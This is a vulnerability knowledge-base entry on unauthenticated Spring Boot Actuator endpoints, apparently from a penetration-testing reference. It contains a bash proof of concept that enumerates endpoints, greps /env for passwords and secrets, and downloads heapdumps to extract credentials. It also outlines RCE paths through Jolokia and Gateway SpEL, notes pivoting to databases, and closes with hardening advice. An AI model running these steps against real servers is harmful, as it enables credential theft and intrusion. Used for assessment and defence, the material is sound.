---
id: "spring-actuator-exposure"
title: "Unauthenticated Spring Boot Actuator (heapdump / Jolokia / Gateway)"
kind: "configuration"
cve: null
related-cves: null
cve-note: "None (configuration flaw; CVE-2022-22947 is a Gateway-specific case)"
severity: "critical"
cvss: 9
severity-basis: "cvss"
severity-note: null
product: "Spring Boot 2.x/3.x"
versions: "Any (endpoints exposed without authentication)"
ports: "8080, 8443, 9090"
keywords: "actuator, heapdump, jolokia, env, gateway, spring"
entry: "Spring Boot Actuator management endpoints"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
/actuator                → Lists available endpoints
/actuator/env  /actuator/heapdump  /actuator/jolokia  /actuator/gateway/routes
Older versions: /env  /heapdump  /jolokia  /trace  /dump
```

## Prerequisites

- `management.endpoints.web.exposure.include=*` without Spring Security protection (common in one-click gray-market-site deployments).

## PoC

```bash
# 1) Enumerate endpoints
for e in env health info beans configprops mappings heapdump threaddump jolokia gateway/routes; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://target/actuator/$e); echo "$e $code"
done

# 2) Configuration disclosure (DB/Redis/OSS/JWT secret)
curl -s http://target/actuator/env | grep -Ei 'password|secret|key|url'

# 3) Retrieve in-memory credentials through heapdump
curl -s -o heap.hprof http://target/actuator/heapdump
# Search for password, token, secret using jvisualvm / MAT / heapdump_tool
```

## Exploitation Steps

1. Enumerate endpoints → common `/env` entries include `spring.datasource.*`, `spring.redis.*`, `oss.accessKey`, `jwt.secret`.
2. Download `/heapdump` and search for credential strings (more complete than `/env`, including runtime-injected secrets); `/threaddump` may reveal internal service addresses.
3. Three RCE paths:
   - `/actuator/jolokia` → `reloadByURL` (Logback `JNDI`, related to `CVE-2021-42550`);
   - POST SpEL to `/actuator/gateway/routes` (`CVE-2022-22947`);
   - `/actuator/env` + `/actuator/refresh` to modify `eureka`/`logback` configuration and induce outbound connections.
4. After DB and Redis access, continue with `kb-cloud-container` and `kb-triage`; these sites often run "frontend+admin+agent" applications on one machine.
5. Cleanup: restore keys changed through `/actuator/env`; retain only the hash and timestamp of uploaded heapdumps.

## Remediation and Mitigation

### Remediation and Mitigation (Hardening)

- Set `management.endpoints.web.exposure.include=health,info`; place management endpoints on a separate, internal-only port.
- Protect `/actuator/**` with Spring Security; disable `heapdump`/`jolokia`/`gateway`.
- Keep secrets out of configuration files; inject through KMS/environment variables and rotate regularly.

## References

- Official Spring Boot Actuator documentation (endpoint exposure); CVE-2022-22947 advisory.
